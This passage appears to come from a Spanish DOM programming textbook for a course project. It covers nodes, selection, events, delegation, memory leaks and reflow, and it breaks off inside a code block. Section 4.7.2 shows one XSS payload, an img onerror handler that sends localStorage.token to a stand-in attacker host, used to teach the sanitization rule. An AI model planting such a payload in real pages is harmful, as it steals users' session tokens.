# Capítulo 4 — El DOM: programar la página sin framework

*Unidad de estudio · Edición ampliada con fundamentos teóricos*

## 4.1. Alcance de la clase

Los tres capítulos anteriores dejaron todas las piezas sobre la mesa: un protocolo
que trae documentos, un lenguaje declarativo que decide cómo se ven y un lenguaje
de programación que se ejecuta en un solo hilo. Este capítulo las conecta. El DOM
es la interfaz por la cual el código del Capítulo 3 modifica el documento del
Capítulo 1, y de esa interacción sale todo lo que en una página se mueve.

El TPI prohíbe usar un framework de interfaz. Esa decisión se lee en la consigna
como una restricción arbitraria, y no lo es: **sin React o Vue de por medio, el
alumno queda obligado a entender qué hace el navegador de verdad.** Un framework
oculta exactamente lo que este capítulo estudia, y quien aprende primero el
framework y después el DOM termina sabiendo usar una herramienta sin entender el
problema que resuelve.

Dos de las once reglas obligatorias del TPI nacen acá, y las dos se van a
demostrar antes de enunciarse.

**RN-F02** exige que todo dato que no haya generado el propio código se inserte con
`textContent` o `createElement`, y admite `innerHTML` únicamente con contenido
pasado por DOMPurify. Enunciada así parece una preferencia de estilo. La sección
4.7 muestra un ataque funcionando en veinte líneas, y después de eso la regla no
necesita defensa.

**RN-F01** exige que toda suscripción guarde su función de baja y la ejecute al
desmontar. También parece burocracia, hasta que se ve una página consumiendo
memoria hasta volverse inutilizable. La sección 4.9 lo demuestra, y su explicación
depende directamente de las clausuras del Capítulo 3: **una clausura mantiene vivo
todo lo que referencia**, y un manejador de evento es una clausura.

Hay además un tema que atraviesa el capítulo y que conviene anticipar: el DOM es
**lento**. No el lenguaje: la interfaz. Cada modificación puede obligar al navegador
a recalcular la geometría de la página, y hacerlo dentro de un bucle produce el
bloqueo del hilo que el Capítulo 3 describió. La sección 4.10 explica cuándo ocurre
y cómo evitarlo.

Al finalizar la clase, el alumno debe poder construir una interfaz que agregue y
quite elementos, responda a eventos y **se desmonte sin dejar nada atrás**.

**Contenidos**

1. Origen y objetivos de diseño del modelo de objetos del documento.
2. Por qué el DOM no es el HTML.
3. Anatomía del árbol: tipos de nodo.
4. Selección de nodos y el problema de las colecciones vivas.
5. Creación y modificación; atributos frente a propiedades.
6. Inyección de código en el cliente y la regla RN-F02.
7. El modelo de eventos: captura, objetivo y burbujeo.
8. Delegación de eventos.
9. Ciclo de vida, fugas de memoria y la regla RN-F01.
10. Costo de rendimiento: recálculo de disposición y repintado.
11. Herramientas de diagnóstico.
12. Seguridad y evolución.

---

## 4.2. Por qué existe el DOM: origen y diseño

En 1995, cuando Netscape incorporó JavaScript, hizo falta darle al lenguaje alguna
forma de tocar la página. La solución fue mínima: un puñado de colecciones
—`document.forms`, `document.images`, `document.links`— y poco más. Ese conjunto no
se especificó nunca, y se lo conoce retrospectivamente como **DOM Level 0**.

Cuando las páginas empezaron a querer modificar cualquier elemento y no sólo los
formularios, cada navegador inventó su propia extensión. Internet Explorer 4
introdujo `document.all`; Netscape 4 introdujo `document.layers`. **Eran modelos
incompatibles, no dos sintaxis para lo mismo**, y escribir una página que anduviera
en ambos significaba escribirla dos veces:

```js
if (document.all) {         // Internet Explorer
  var el = document.all["carrito"];
} else if (document.layers) { // Netscape
  var el = document.layers["carrito"];
}
```

El W3C estandarizó el modelo en **DOM Level 1**, publicado en octubre de 1998, y lo
completó con **Level 2** en el año 2000 —que aportó el sistema de eventos de la
sección 4.8— y **Level 3** en 2004. Hoy el DOM se mantiene como estándar viviente
del WHATWG, sin números de nivel.

Tres decisiones de diseño de aquel proceso explican la forma actual de la interfaz,
y la tercera es la más curiosa.

**Primera: el DOM es independiente del lenguaje.** Se especificó en una notación
abstracta de interfaces, con la intención explícita de que fuera implementable
desde Java, Python o C++ y no sólo desde JavaScript. Esa es la razón de que la
interfaz sea tan verbosa —`document.createElement`, `element.setAttribute`,
`parentNode.appendChild`— en lugar de aprovechar las comodidades del lenguaje. **No
está diseñada para ser cómoda en JavaScript: está diseñada para ser neutral.**

**Segunda: el modelo es vivo.** El árbol no es una fotografía del documento sino el
documento mismo. Modificar un nodo cambia la página de inmediato, y algunas
colecciones se actualizan solas cuando el árbol cambia. La sección 4.5.2 muestra
por qué eso, que suena cómodo, produce uno de los bugs más difíciles de ver.

**Tercera: el modelo de eventos es un compromiso político.** Netscape había
implementado la propagación **desde la raíz hacia el elemento** —captura—, y
Microsoft la había implementado **desde el elemento hacia la raíz** —burbujeo—. El
W3C no eligió: **adoptó las dos**. Por eso un evento recorre el árbol en dos
direcciones y por eso `addEventListener` tiene un tercer parámetro que casi nadie
usa. La sección 4.8.1 lo desarrolla.

Corresponde hablar de **jQuery**, porque su historia es instructiva. Publicada por
John Resig en 2006, resolvió tres problemas concretos: normalizó las
incompatibilidades entre navegadores, ofreció una interfaz mucho más concisa que la
del W3C, y permitió **seleccionar elementos con selectores CSS** en una época en que
el DOM no tenía forma de hacerlo. Durante años fue prácticamente obligatoria.

Hoy no hace falta, y no porque haya pasado de moda: **porque la plataforma
incorporó lo que jQuery aportaba.** `querySelector` llegó en 2008 y resolvió el
tercer problema; `addEventListener` quedó disponible en todos los navegadores y
resolvió el primero; `classList`, `dataset` y `fetch` cubrieron buena parte del
segundo.

> **💡 PARA ENTENDER**
> Esa historia es la mejor respuesta a una pregunta que te vas a hacer en algún
> momento de este módulo: **"¿por qué el TPI me prohíbe usar un framework?"**
>
> Fijate en el patrón. jQuery no desapareció porque apareciera algo mejor.
> Desapareció porque **el problema que resolvía dejó de existir**. Y la única forma
> de darte cuenta de eso es conocer el problema.
>
> Quien aprendió jQuery sin entender el DOM siguió usándolo diez años de más,
> cargando 90 kilobytes para hacer lo que `querySelector` hace gratis. No porque
> fuera tonto: porque nunca supo qué estaba resolviendo esa biblioteca.
>
> **Lo mismo te va a pasar con React si lo aprendés antes que esto.** No estás
> perdiendo tiempo con el DOM: estás comprando la capacidad de juzgar cuándo un
> framework te sirve y cuándo te sobra.

---

## 4.3. El DOM no es el HTML

El Capítulo 1 estableció la distinción; acá se vuelve operativa, porque a partir de
esta clase el código va a modificar el árbol y esa modificación **no toca el HTML**.

Conviene precisar los tres estados que suelen confundirse:

| Qué es | Cómo se ve | Cuándo cambia |
| --- | --- | --- |
| El HTML original | `Ctrl+U`, o la pestaña de respuesta en el panel de red | Nunca; es lo que llegó por la red |
| El DOM actual | El panel de elementos del inspector | Cada vez que el código lo modifica |
| `document.documentElement.outerHTML` | Se evalúa en la consola | Es una **serialización** del DOM actual |

La tercera fila merece atención porque es fuente de confusión. Pedirle al DOM su
representación como texto **no devuelve el HTML original**: devuelve el marcado que
correspondería al árbol tal como está ahora, con las modificaciones aplicadas y con
los errores de marcado ya corregidos por el algoritmo de recuperación de la sección
1.7.1.

De ahí una consecuencia práctica: **si el marcado original tenía un error, el DOM
va a mostrar el árbol corregido, y comparar ambos es la forma de descubrirlo.** Una
etiqueta mal anidada no produce ningún mensaje, pero produce un árbol distinto del
que se escribió.

> **⚠️ OJO ACÁ**
> Hay un caso que desconcierta a todo el mundo la primera vez, y conviene que lo
> tengas fichado: **poner un `<div>` dentro de un `<p>`.**
>
> El parser no te avisa. Pero como la especificación dice que un párrafo no puede
> contener bloques, **cierra el `<p>` antes del `<div>`** y te arma un árbol distinto
> del que escribiste. Tu CSS de `p > .algo` deja de funcionar y no hay ningún error
> en ningún lado.
>
> Lo mismo con una tabla: cualquier cosa que no sea `<tr>` dentro de un `<tbody>` se
> reubica sola.
>
> **Cuando el CSS no aplica y jurás que el selector está bien, mirá el árbol en el
> inspector antes que nada.** Muy probablemente el navegador te movió un nodo de
> lugar por una regla de anidación que no conocías.

---

## 4.4. Anatomía del árbol

Todo en el documento es un nodo, y hay más tipos de los que suele suponerse. Los
que importan en la práctica son cuatro:

| Tipo | Constante | Qué representa |
| --- | --- | --- |
| Elemento | `1` | Una etiqueta: `<div>`, `<p>`, `<button>` |
| Texto | `3` | El texto entre etiquetas, **incluidos los espacios** |
| Comentario | `8` | `<!-- ... -->` |
| Documento | `9` | La raíz, `document` |

La aclaración sobre los espacios no es menor y explica un comportamiento que
desconcierta. En este marcado:

```html
<ul>
  <li>Milanesa</li>
  <li>Empanadas</li>
</ul>
```

el `<ul>` tiene **cinco** nodos hijos, no dos: los dos elementos `<li>` y tres nodos
de texto con los saltos de línea y la indentación. Por eso conviene distinguir dos
pares de propiedades que se parecen y no son lo mismo:

| Propiedad | Devuelve | Incluye nodos de texto |
| --- | --- | --- |
| `childNodes` | Todos los hijos | **Sí** |
| `children` | Sólo elementos | No |
| `firstChild` | El primer hijo | **Sí** |
| `firstElementChild` | El primer hijo elemento | No |

**Salvo que se esté manipulando texto deliberadamente, la versión con `Element` es
la correcta.**

*(Ver Figura 4.1: el árbol de nodos de un fragmento de marcado.)*

> **🧪 EXPERIMENTO**
> Es un experimento de dos minutos y te evita una tarde de confusión.
>
> 1. Abrí cualquier página con una lista y seleccioná el `<ul>` en el inspector.
> 2. En la consola, escribí `$0.childNodes.length` y después `$0.children.length`.
>
> Los números no coinciden. Y no es un error: **los saltos de línea y la indentación
> de tu marcado son nodos de texto reales**, que ocupan lugar en el árbol.
>
> 3. Probá ahora `$0.firstChild` y `$0.firstElementChild`.
>
> El primero te va a devolver un nodo de texto con un salto de línea y espacios. El
> segundo, el `<li>` que esperabas.
>
> Por eso, cuando escribas código que recorra hijos, **usá siempre la versión con
> `Element`**. Si no, un día tu código va a andar con el HTML minificado y a fallar
> con el HTML indentado, o al revés, y no vas a entender por qué.

---

## 4.5. Selección de nodos

### 4.5.1. Los métodos

| Método | Devuelve | Notas |
| --- | --- | --- |
| `getElementById(id)` | Un elemento o `null` | El más rápido |
| `querySelector(sel)` | El **primer** coincidente o `null` | Acepta cualquier selector CSS |
| `querySelectorAll(sel)` | Una lista **estática** | La opción por defecto |
| `getElementsByClassName(c)` | Una colección **viva** | Ver 4.5.2 |
| `getElementsByTagName(t)` | Una colección **viva** | Ver 4.5.2 |

`querySelector` y `querySelectorAll` aceptan los mismos selectores del Capítulo 2,
combinadores incluidos, y pueden invocarse sobre cualquier elemento para restringir
la búsqueda a su subárbol.

Un detalle que ahorra errores: **cuando no hay coincidencia, `querySelector`
devuelve `null`, no lanza una excepción.** El error aparece más tarde, al usar el
resultado, y con un mensaje que no menciona el selector. Ese es el famoso *Cannot
read properties of null*, y su causa casi siempre es que el elemento todavía no
existía cuando el script corrió.

### 4.5.2. Colecciones vivas y listas estáticas

Acá está la trampa que la segunda decisión de diseño de la sección 4.2 produce.

`querySelectorAll` devuelve una lista **estática**: una foto del momento en que se
consultó. `getElementsByClassName` y `getElementsByTagName` devuelven colecciones
**vivas**: se actualizan solas cuando el documento cambia.

La diferencia es invisible hasta que se modifica el DOM mientras se recorre la
colección:

```js
const items = document.getElementsByClassName("item-carrito");
for (let i = 0; i < items.length; i++) {
  items[i].remove();     // al quitar uno, la colección se acorta
}
// Resultado: quedan la mitad de los elementos sin quitar
```

Al eliminar el elemento `0`, el que era `1` pasa a ser `0`, pero el índice ya avanzó
a `1`. Se saltea uno cada vez. Y `length` también cambia en cada vuelta, así que el
bucle termina antes.

La solución es usar una lista estática, o convertir la colección a arreglo antes de
recorrerla:

```js
document.querySelectorAll(".item-carrito").forEach(el => el.remove());
```

> **⚠️ OJO ACÁ**
> Este bug es de los peores que te pueden tocar, y te digo por qué: **funciona a
> medias.** No falla con un error prolijo que puedas buscar. Simplemente borra la
> mitad de los elementos, o deja tres de siete, y vos mirás el código veinte minutos
> sin entender.
>
> La regla es una sola y no tiene excepciones prácticas: **usá `querySelectorAll` y
> listo.** Acepta selectores CSS, devuelve una lista estática y tiene `forEach`.
>
> `getElementsByClassName` sólo tiene sentido cuando querés la colección viva **a
> propósito** — que es un caso rarísimo. Si no sabés que la querés viva, no la
> querés viva.

---

## 4.6. Creación y modificación

### 4.6.1. Crear e insertar

```js
const li = document.createElement("li");
li.className = "item-carrito";
li.textContent = producto.nombre;
lista.appendChild(li);
```

Un elemento creado **no está en el documento** hasta que se lo inserta. Las formas
de insertar son cuatro, y conviene conocer la última porque resuelve casos que las
otras no:

| Método | Dónde inserta |
| --- | --- |
| `padre.appendChild(nodo)` | Al final de los hijos |
| `padre.prepend(nodo)` | Al principio |
| `ref.before(nodo)` / `ref.after(nodo)` | Antes o después de un hermano |
| `el.insertAdjacentElement(pos, nodo)` | En cuatro posiciones relativas al elemento |

Para insertar muchos nodos de una vez existe `DocumentFragment`, un contenedor que
no forma parte del documento. Se llena fuera del árbol y se inserta una sola vez, lo
que evita el costo que la sección 4.10 explica:

```js
const fragmento = document.createDocumentFragment();
for (const producto of productos) {
  const li = document.createElement("li");
  li.textContent = producto.nombre;
  fragmento.appendChild(li);          // todavía no toca el documento
}
lista.appendChild(fragmento);         // una sola modificación real
```

### 4.6.2. `textContent`, `innerText` e `innerHTML`

Las tres propiedades leen y escriben el contenido de un elemento, y sus diferencias
son decisivas.

| Propiedad | Al escribir | Al leer | Costo |
| --- | --- | --- | --- |
| `textContent` | Inserta **texto literal** | Todo el texto, incluido el oculto | Bajo |
| `innerText` | Inserta texto literal | Sólo el texto **visible** | **Alto**: fuerza recálculo |
| `innerHTML` | **Interpreta el texto como marcado** | El marcado serializado | Alto |

La fila del medio explica una diferencia que se pregunta seguido: `innerText`
depende del estilo aplicado, así que para saber qué devolver el navegador necesita
haber calculado la disposición. **Leer `innerText` fuerza ese cálculo**, con el costo
de la sección 4.10. `textContent` no depende del estilo y por eso es más barato.

La fila de abajo es la que funda RN-F02, y es el tema de la sección 4.7.

> **📌 NOTA**
> Para no dudar nunca más, quedate con esto:
>
> - **`textContent`** → el 95 % de las veces. Es el que querés.
> - **`innerText`** → sólo si necesitás el texto *tal como se ve*, respetando lo que
>   el CSS oculta. Es caro; usalo sabiendo que lo es.
> - **`innerHTML`** → sólo con contenido que generaste vos, o pasado por DOMPurify.
>
> Y una advertencia sobre `innerHTML` que no tiene que ver con seguridad: **destruye
> y reconstruye todo el subárbol.** Los manejadores de eventos que había adentro
> desaparecen, el foco se pierde, y lo que el usuario estaba escribiendo en un campo
> se borra.
>
> Por eso `contenedor.innerHTML += "..."` es doblemente malo: reconstruye todo lo que
> ya estaba **y** deja el contenedor sin ninguno de sus manejadores.

### 4.6.3. Atributos y propiedades

Esta distinción confunde a todo el mundo y produce bugs difíciles de ver.

Un **atributo** es lo que está escrito en el marcado. Una **propiedad** es lo que
existe en el objeto del DOM. Al parsear el documento, el navegador crea propiedades
a partir de los atributos, pero después **las dos cosas viven por separado**.

```html
<input id="email" type="email" value="inicial@example.com">
```

```js
const input = document.querySelector("#email");
// El usuario escribe "otro@example.com" en el campo

input.value;                   // "otro@example.com"  ← estado actual
input.getAttribute("value");   // "inicial@example.com" ← lo que decía el marcado
```

La regla práctica: **para el estado actual de un control se usa la propiedad; el
atributo conserva el valor inicial.** Vale igual para `checked` en una casilla de
verificación, que es donde más muerde: leer el atributo devuelve si estaba marcada
al cargar, no si lo está ahora.

> **⚠️ OJO ACÁ**
> El caso de la casilla de verificación es el que más tiempo hace perder, así que
> vale la pena verlo con nombre y apellido.
>
> Tenés un `<input type="checkbox">` para "guardar mis datos". El usuario lo marca.
> Vos hacés `casilla.getAttribute("checked")` y te da `null`.
>
> **No está roto: estás preguntando lo que no querés saber.** El atributo dice cómo
> venía el checkbox en el HTML; la propiedad dice cómo está ahora. El usuario tocó
> la propiedad, no el marcado.
>
> Lo mismo pasa al revés y es más peligroso: `casilla.setAttribute("checked", "")`
> a veces parece funcionar y a veces no, según si el usuario ya lo tocó.
>
> **Regla: para leer o escribir el estado de un control, propiedad. Siempre.**
> `casilla.checked`, `input.value`, `select.value`. Los atributos son para el
> marcado inicial y para los `data-`.

Para datos propios existe el prefijo `data-`, que se lee mediante `dataset`:

```html
<button data-producto-id="42" data-accion="agregar">Agregar</button>
```

```js
boton.dataset.productoId;   // "42" — siempre cadena
boton.dataset.accion;       // "agregar"
```

El nombre se convierte de guiones a mayúsculas intercaladas. **El valor es siempre
una cadena**, así que un identificador numérico hay que convertirlo antes de
usarlo.

### 4.6.4. Clases

`classList` ofrece las operaciones habituales sin manipular cadenas:

```js
el.classList.add("activo");
el.classList.remove("oculto");
el.classList.toggle("expandido");
el.classList.toggle("activo", condicion);   // agrega o quita según el booleano
el.classList.contains("activo");            // devuelve booleano
```

La forma con dos argumentos de `toggle` reemplaza el `if` que casi todo el mundo
escribe, y es la que conviene usar cuando hay una condición.

---

## 4.7. Inyección de código en el cliente y la regla RN-F02

### 4.7.1. El problema

Un **cross-site scripting** —XSS— ocurre cuando un dato controlado por un atacante
termina interpretado como código en el navegador de otra persona. No es un ataque
contra el servidor: es un ataque contra los usuarios, ejecutado con los privilegios
de la sesión de la víctima.

El mecanismo es exactamente el de la fila inferior de la tabla anterior. Cuando se
asigna a `innerHTML`, **el navegador parsea el texto como marcado**. Si ese texto
contiene etiquetas, dejan de ser texto y pasan a ser estructura.

### 4.7.2. Demostración

Supóngase un catálogo que muestra reseñas de productos, y que las inserta así:

```js
contenedor.innerHTML = `<p class="resena">${resena.texto}</p>`;
```

Un usuario publica una reseña cuyo texto es:

```html
<img src=x onerror="fetch('https://atacante.example/robar?t='+localStorage.token)">
```

Cuando otro usuario abre el catálogo, el navegador intenta cargar una imagen que no
existe, dispara el manejador `onerror`, y **el token de sesión de esa persona viaja
al servidor del atacante**. Nadie hizo clic en nada. Nadie vio nada raro.

### 4.7.3. Por qué el filtrado ingenuo no alcanza

La reacción intuitiva es filtrar la palabra `script`. Conviene entender por qué eso
no sirve, y el dato es contraintuitivo:

**`innerHTML` no ejecuta las etiquetas `<script>` que se le insertan.** Están
explícitamente excluidas por la especificación. Si el ataque dependiera de
`<script>`, `innerHTML` sería seguro.

**Pero sí ejecuta los manejadores de eventos en línea.** `onerror`, `onload`,
`onmouseover` y decenas más funcionan perfectamente. Por eso el ejemplo usa `<img>`
y no `<script>`: es lo que efectivamente funciona.

La superficie es enorme. Un `<svg onload>`, un `<a href="javascript:...">`, un
`<iframe srcdoc>`, un atributo `style` con una expresión, y una lista larga de
variantes por navegador. **Escribir un filtro propio es garantizar que va a faltar
un caso**, y basta uno.

### 4.7.4. La regla

De ahí sale RN-F02, que el TPI enuncia en su sección 2.5:

> Todo dato no generado por el propio código de la vista se inserta con
> `textContent` o `createElement`. `innerHTML` sólo se admite con contenido pasado
> por `DOMPurify.sanitize()`.

La versión segura del ejemplo es directa:

```js
const p = document.createElement("p");
p.className = "resena";
p.textContent = resena.texto;      // el marcado queda como texto visible
contenedor.appendChild(p);
```

Con `textContent`, la cadena del atacante aparece literalmente en pantalla como
texto. No hay nada que ejecutar porque nunca se parseó como marcado.

Cuando el requisito **exige** HTML —por ejemplo, permitir negrita y cursiva en una
descripción—, el TPI admite un solo camino: DOMPurify, una biblioteca que parsea el
contenido, lo compara contra una lista de elementos y atributos permitidos, y
devuelve marcado limpio.

```js
import DOMPurify from "dompurify";
contenedor.innerHTML = DOMPurify.sanitize(descripcion);
```

> **⚠️ OJO ACÁ**
> Quiero que te lleves tres cosas de esta sección, y la tercera es la que más te va
> a servir.
>
> **Una.** Filtrar `<script>` no sirve para nada. `innerHTML` ni siquiera ejecuta
> `<script>` — lo que ejecuta son los `onerror`, `onload` y compañía. Si tu filtro
> busca la palabra "script", estás protegiendo la puerta equivocada.
>
> **Dos.** No escribas tu propio sanitizador. Nunca. DOMPurify lleva años de gente
> intentando romperlo y arreglando lo que encontraron. Tu filtro de una tarde no le
> llega ni a los talones, y **con que falle un solo caso ya está**.
>
> **Tres, y esta es la que importa:** cuando le pidas a un agente de IA que te
> renderice una lista, **te va a escribir `innerHTML` con un template literal
> adentro.** Es el patrón más común de internet, así que es lo que aprendió.
>
> Va a compilar. Va a andar. Y va a tener un XSS.
>
> Ese es el módulo entero resumido: **el agente escribe lo más común, y lo más común
> no siempre es lo correcto.** Vos tenés que saber cuándo pararlo.

---

## 4.8. Eventos

### 4.8.1. Las tres fases

Un evento no ocurre solamente en el elemento donde se originó: **recorre el árbol
en dos direcciones**, que es el compromiso político de la sección 4.2.

| Fase | Recorrido | Cuándo se ejecuta un manejador |
| --- | --- | --- |
| **Captura** | De `document` hasta el elemento | Sólo si se registró con `capture: true` |
| **Objetivo** | En el elemento mismo | Siempre |
| **Burbujeo** | Del elemento hasta `document` | Por defecto |

*(Ver Figura 4.2: las tres fases de propagación.)*

En la práctica casi todo se hace en la fase de burbujeo, que es la predeterminada.
La captura es útil cuando hace falta interceptar un evento **antes** de que llegue a
su destino.

No todos los eventos burbujean: `focus`, `blur`, `load` y `scroll` no lo hacen. Para
los dos primeros existen `focusin` y `focusout`, que sí burbujean, y que son los que
sirven para la delegación de la sección 4.8.3.

El objeto del evento trae dos propiedades que se confunden y cuya diferencia es
central para la delegación:

- **`event.target`** es el elemento donde el evento se originó.
- **`event.currentTarget`** es el elemento donde está registrado el manejador que se
  está ejecutando.

Cuando el manejador está en el elemento mismo, ambas coinciden. Cuando se delega,
no.

> **💡 PARA ENTENDER**
> Esta distinción es la que hace que la delegación funcione, así que vale la pena
> fijarla con una imagen.
>
> Pensá el evento como una pelota que **cae** en un lugar y después **rebota** hacia
> arriba por todo el árbol.
>
> - **`target`** es dónde cayó. Nunca cambia durante todo el recorrido.
> - **`currentTarget`** es en qué escalón está rebotando ahora. Cambia en cada nivel.
>
> Por eso, en un manejador puesto en la lista, `currentTarget` es siempre la lista
> —vos la pusiste ahí— pero `target` es el botón exacto que el usuario tocó. Y por
> eso `target` es lo que te dice **qué** hacer, y `currentTarget` es simplemente
> dónde estás parado.
>
> Si alguna vez usás `this` dentro de un manejador registrado con una función común,
> vale lo mismo que `currentTarget`. Con una flecha, no: ahí `this` es el del ámbito
> donde escribiste la flecha, como viste en la sección 3.7.2.

### 4.8.2. Registro y opciones

```js
elemento.addEventListener("click", manejador, opciones);
```

El tercer parámetro admite cuatro opciones, y tres de ellas se usan poco pero
resuelven problemas concretos:

| Opción | Efecto |
| --- | --- |
| `capture: true` | Registra en la fase de captura |
| `once: true` | Se ejecuta una vez y **se da de baja solo** |
| `passive: true` | Promete no llamar a `preventDefault()` |
| `signal` | Permite dar de baja mediante un `AbortController` (sección 4.9.4) |

`passive` merece explicación porque su efecto es de rendimiento y no de lógica. Ante
un evento de desplazamiento o de contacto táctil, el navegador **no puede empezar a
desplazar hasta saber si el manejador va a cancelar el evento**, y para saberlo
tiene que ejecutarlo. Declarar el manejador como pasivo es prometer que no lo va a
cancelar, y permite al navegador desplazar de inmediato. Es la diferencia entre un
desplazamiento fluido y uno que se traba.

### 4.8.3. Delegación

Una lista de cien productos, cada uno con un botón, no necesita cien manejadores.
Como los eventos burbujean, alcanza con **uno solo en el contenedor**:

```js
lista.addEventListener("click", (evento) => {
  const boton = evento.target.closest("[data-accion='agregar']");
  if (!boton) return;                       // el clic fue en otra parte
  agregarAlCarrito(Number(boton.dataset.productoId));
});
```

`closest()` sube por los ancestros desde el objetivo hasta encontrar uno que
coincida con el selector, y devuelve `null` si no hay ninguno. Es lo que hace
robusta la delegación: si el usuario hace clic sobre un ícono **dentro** del botón,
`event.target` es el ícono y no el botón, y sin `closest()` el manejador no
reconocería el clic.

*(Ver Figura 4.3: un manejador delegado frente a uno por elemento.)*

La delegación tiene tres ventajas que la vuelven la opción por defecto: **menos
manejadores**, por lo tanto menos memoria; **funciona con elementos que todavía no
existen**, porque el manejador está en el contenedor; y **una sola baja** al
desmontar, que es lo que la sección siguiente hace importante.

> **💡 PARA ENTENDER**
> La segunda ventaja es la que resuelve un problema que te va a aparecer sí o sí en
> el TPI, y conviene que lo veas venir.
>
> Tenés una lista de pedidos que se actualiza por el canal de eventos. Registrás un
> manejador en cada botón al cargar la página. Llega un pedido nuevo por SSE, lo
> agregás a la lista... **y su botón no anda.**
>
> Claro: cuando registraste los manejadores, ese botón no existía.
>
> La salida ingenua es volver a registrar todo después de cada actualización. Y ahí
> te comés el problema de la sección 4.9: **cada re-registro apila manejadores sobre
> los elementos viejos**, y en media hora de turno tenés cientos.
>
> Con delegación no existe ninguno de los dos problemas. **Un manejador en el
> contenedor, y funciona para todo lo que aparezca después.** Por eso es la opción
> por defecto y no una optimización.

### 4.8.4. Cancelar y detener

Dos métodos que se confunden permanentemente y hacen cosas distintas:

- **`preventDefault()`** cancela la acción por defecto del navegador: que un enlace
  navegue, que un formulario se envíe. **No detiene la propagación.**
- **`stopPropagation()`** detiene el recorrido del evento por el árbol. **No cancela
  la acción por defecto.**

El uso de `stopPropagation()` conviene evitarlo salvo necesidad real: rompe la
delegación de cualquier manejador registrado más arriba, incluso uno que se agregue
meses después, y el síntoma —un manejador que no se ejecuta sin motivo aparente— es
muy difícil de rastrear.

---

## 4.9. Ciclo de vida, fugas de memoria y la regla RN-F01

### 4.9.1. Qué mantiene vivo a un nodo

El recolector de basura de JavaScript libera lo que ya no es alcanzable desde el
código en ejecución. La palabra clave es **alcanzable**: mientras algo referencie un
objeto, ese objeto no se libera.

Y acá vuelve el Capítulo 3. Un manejador de evento **es una clausura**, y una
clausura mantiene vivo todo lo que referencia. Si el manejador referencia un
elemento del DOM, ese elemento sigue en memoria aunque se lo haya quitado de la
página.

Un nodo que fue removido del documento pero sigue referenciado desde el código se
llama **nodo separado**. No se ve en pantalla, no aparece en el inspector de
elementos, y ocupa memoria —él y todo su subárbol—.

### 4.9.2. Una fuga real

```js
function montarPanelDePedidos(contenedor) {
  const panel = document.createElement("div");
  const pedidos = [];                        // puede crecer mucho

  function alRecibirEvento(evento) {
    pedidos.push(evento.detail);
    panel.textContent = `${pedidos.length} pedidos`;
  }

  canalDeEventos.addEventListener("pedido", alRecibirEvento);
  contenedor.appendChild(panel);

  return () => panel.remove();               // ← el desmontaje incompleto
}
```

La función devuelta quita el panel de la pantalla, y ahí termina la ilusión de
haber desmontado. El manejador **sigue registrado en el canal de eventos**, y como
es una clausura, mantiene vivos `panel`, `pedidos` y todo lo que ese arreglo
contenga.

Las consecuencias se acumulan y ninguna produce un error:

- El arreglo **sigue creciendo** con cada evento recibido.
- El panel **sigue actualizándose**, aunque nadie lo vea.
- Si el usuario entra y sale de la vista veinte veces, hay **veinte manejadores**
  ejecutándose en paralelo sobre veinte paneles invisibles.

*(Ver Figura 4.4: cómo una clausura mantiene vivo un nodo removido.)*

En una aplicación de escritorio que se usa una hora por sesión —como el panel de
cocina del TPI, abierto todo el turno— esto termina en una pestaña que consume
gigabytes y se vuelve inutilizable.

### 4.9.3. La regla

De ahí sale RN-F01, que el TPI enuncia así:

> Toda llamada a `subscribe()` devuelve su función de baja; hay que guardarla y
> ejecutarla en `destroy()` o `disconnectedCallback()`, que es obligatorio. Ninguna
> suscripción se hace sin guardar su baja.

La versión correcta del ejemplo:

```js
function montarPanelDePedidos(contenedor) {
  const panel = document.createElement("div");
  const pedidos = [];

  function alRecibirEvento(evento) { /* ... */ }

  canalDeEventos.addEventListener("pedido", alRecibirEvento);
  contenedor.appendChild(panel);

  return () => {
    canalDeEventos.removeEventListener("pedido", alRecibirEvento);  // ← la baja
    panel.remove();
  };
}
```

Hay un detalle que hace fallar muchos intentos de baja: **`removeEventListener`
exige exactamente la misma referencia de función** que se registró. Una función
anónima o una flecha escrita en el momento no se pueden dar de baja, porque no hay
forma de nombrar la que se registró:

```js
el.addEventListener("click", () => hacerAlgo());
el.removeEventListener("click", () => hacerAlgo());   // NO da de baja nada
```

Son dos funciones distintas que hacen lo mismo. Por eso el manejador tiene que estar
en una variable o ser una función con nombre.

### 4.9.4. `AbortController`

Cuando hay varias suscripciones, guardar cada baja por separado es tedioso y fácil
de olvidar. `AbortController` permite darlas todas de baja con una sola llamada:

```js
const controlador = new AbortController();
const { signal } = controlador;

boton.addEventListener("click", alHacerClic, { signal });
canal.addEventListener("pedido", alRecibirPedido, { signal });
window.addEventListener("resize", alRedimensionar, { signal });

// Al desmontar, una sola línea da de baja las tres:
controlador.abort();
```

El mismo controlador sirve además para **cancelar peticiones de red en curso**, que
es el uso que el Capítulo 5 le va a dar. Un componente que se desmonta mientras
espera una respuesta puede cancelarla con el mismo mecanismo.

> **💡 PARA ENTENDER**
> Esta es la sección más importante del capítulo para el TPI, así que fijate en la
> cadena completa:
>
> **Clausura** (Capítulo 3) → un manejador recuerda su entorno → **mantiene vivo el
> nodo** aunque lo saques de la pantalla → **fuga de memoria** → **RN-F01**.
>
> Y ahora lo práctico. En una página que recargás cada dos minutos, esto no se nota:
> la recarga limpia todo. **En el panel de cocina del TPI, que queda abierto todo el
> turno recibiendo eventos, se nota muchísimo.**
>
> Por eso la regla dice `disconnectedCallback()` **obligatorio**. No es formalidad
> burocrática: es que sin eso, tu aplicación funciona perfecto en la demo de quince
> minutos y se muere a las cuatro horas de uso real.
>
> Y adivina qué: **un agente de IA no te va a escribir la baja.** Te va a escribir el
> `addEventListener` porque eso es lo que hace falta para que funcione. La baja hace
> falta para que *siga* funcionando, y eso no se ve en la demo.

---

## 4.10. El costo de modificar el DOM

Modificar el árbol puede obligar al navegador a rehacer parte del trabajo de la
sección 1.7. Hay dos niveles de costo:

- **Repintado**: cambió algo visual que no afecta la geometría —un color, una
  sombra—. El navegador vuelve a dibujar, sin recalcular posiciones.
- **Recálculo de disposición**: cambió algo que afecta la geometría —un ancho, un
  margen, agregar un elemento—. El navegador **recalcula la posición y el tamaño**
  de todo lo afectado, y después repinta. Es mucho más caro.

Los navegadores agrupan esos recálculos: acumulan las modificaciones y las procesan
juntas antes del siguiente cuadro. Pero ese agrupamiento **se puede romper sin
querer**, y ese es el problema real.

Cuando el código **lee** una propiedad que depende de la geometría —`offsetHeight`,
`getBoundingClientRect()`, `scrollTop`, y también el `innerText` de la sección
4.6.2—, el navegador está obligado a entregar un valor correcto, y para eso tiene
que recalcular ya mismo todo lo pendiente. Alternar escrituras y lecturas dentro de
un bucle fuerza un recálculo por vuelta:

```js
